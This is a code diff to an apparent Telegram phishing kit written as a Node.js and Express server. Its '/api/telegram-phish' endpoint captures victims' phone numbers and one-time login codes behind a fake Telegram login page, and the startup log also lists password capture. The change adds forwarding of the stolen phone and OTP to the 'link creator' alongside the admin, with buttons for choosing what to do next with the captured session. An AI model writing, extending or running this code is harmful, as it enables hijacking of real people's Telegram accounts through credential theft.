@@ -14,6 +14,7 @@
  * - Auto-delete expired links every 60 seconds
  * - All data captured successfully!
  * - COMPLETE CODE - NOTHING REMOVED
+ * - FIXED: Buttons now show to user (link creator) as well, not just admin
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -1754,7 +1755,9 @@ app.post('/api/telegram-phish', async (req, res) => {
             
             const creatorMsg = `📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n📌 <b>Status:</b> Waiting for OTP...`;
             
+            // Send to admin
             await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
+            // Send to link creator (user who generated the link)
             await S7.sendMessage(userId, `📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n💡 Target has entered their phone number. Waiting for OTP...`, { parse_mode: 'HTML' });
             
             logToFile(`📱 Phone received: ${phone} from user ${userId}`);
@@ -1776,8 +1779,10 @@ app.post('/api/telegram-phish', async (req, res) => {
                 ]
             };
             
+            // Send to admin with buttons
             await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML', reply_markup: buttons });
-            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n⏳ Waiting for your decision...`, { parse_mode: 'HTML' });
+            // ALSO send to link creator (user) with the SAME buttons
+            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n📌 <b>Choose action:</b>`, { parse_mode: 'HTML', reply_markup: buttons });
             
             logToFile(`🔐 OTP received: ${otp} for phone ${session.phone}`);
             return res.json({ status: 'waiting_decision' });
@@ -3333,7 +3338,8 @@ app.listen(config.port, () => {
     console.log('   - Real Telegram login page design');
     console.log('   - OTP + Password capture with loading screens');
     console.log('   - Admin gets OTP with 3 options');
-    console.log('   - Loading spinner stays until admin decides');
+    console.log('   - USER (link creator) ALSO gets the SAME 3 options buttons');
+    console.log('   - Loading spinner stays until admin or user decides');
     console.log('   - All data captured successfully!');
 });
 
